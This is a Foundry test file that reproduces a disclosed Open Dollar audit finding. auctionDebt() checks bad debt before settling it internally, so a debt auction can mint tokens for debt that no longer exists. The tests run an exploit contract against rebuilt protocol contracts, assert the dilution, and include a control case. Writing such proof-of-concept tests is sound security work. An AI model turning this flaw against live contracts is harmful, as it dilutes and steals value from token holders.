// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./29348-h-02-missing-debt-check-lets-users-start-a-debt-auction-of-n.sol";

/*//////////////////////////////////////////////////////////////
    Open Dollar — missing debt check lets users start a debt auction of
    non-existent debt (H-02, #29348)

    AccountingEngine.auctionDebt() checks that enough bad debt exists BEFORE
    calling settleDebt, but settleDebt can then consume ALL of that debt,
    leaving the auction it just started backed by nothing.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm (debt zeroed, tokens still minted) independently.
    - test_auctionDebt_direct_mintsForZeroDebt: standalone rebuild mirroring
      the finding's "second test case" (direct auctionDebt() call).
    - test_control_externalSettleFirst_reverts: control — mirrors the
      finding's "first test case" (settleDebt called externally first): the
      SAME debt state correctly reverts when settled before auctionDebt is
      called, proving the bug is specifically the check-before-settle ordering.
//////////////////////////////////////////////////////////////*/
contract AuctionDebtNoDebtCheckTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.safeEngine().debtBalance(address(e.accountingEngine())), 0, "debt should be fully settled");
        assertEq(e.token().balanceOf(address(e)), e.TOKENS_PER_AUCTION(), "attacker should hold the diluted tokens");
    }

    function test_auctionDebt_direct_mintsForZeroDebt() public {
        ProtocolToken token = new ProtocolToken();
        SafeEngine safeEngine = new SafeEngine();
        DebtAuctionHouse dah = new DebtAuctionHouse(token);
        AccountingEngine accountingEngine = new AccountingEngine(safeEngine, dah, 100 ether, 500 ether);

        address attacker = makeAddr("attacker");

        safeEngine.createUnbackedDebt(address(accountingEngine), address(accountingEngine), 100 ether);

        vm.prank(attacker);
        accountingEngine.auctionDebt(); // no external settleDebt call first

        assertEq(safeEngine.debtBalance(address(accountingEngine)), 0, "debt fully consumed by internal settle");
        assertEq(token.balanceOf(attacker), 500 ether, "harm: tokens minted for debt that's now gone");
    }

    /// @notice Control: mirrors the finding's FIRST test case. If settleDebt
    ///         is called EXTERNALLY before auctionDebt, the check correctly
    ///         sees the POST-settle (zero) debt and reverts — proving the bug
    ///         is specifically that auctionDebt's own internal ordering checks
    ///         pre-settle state.
    function test_control_externalSettleFirst_reverts() public {
        ProtocolToken token = new ProtocolToken();
        SafeEngine safeEngine = new SafeEngine();
        DebtAuctionHouse dah = new DebtAuctionHouse(token);
        AccountingEngine accountingEngine = new AccountingEngine(safeEngine, dah, 100 ether, 500 ether);

        safeEngine.createUnbackedDebt(address(accountingEngine), address(accountingEngine), 100 ether);

        // Settle externally FIRST — debt is now 0 before auctionDebt runs.
        accountingEngine.settleDebt(100 ether);
        assertEq(safeEngine.debtBalance(address(accountingEngine)), 0);

        vm.expectRevert(AccountingEngine.AccEng_InsufficientDebt.selector);
        accountingEngine.auctionDebt();
    }
}
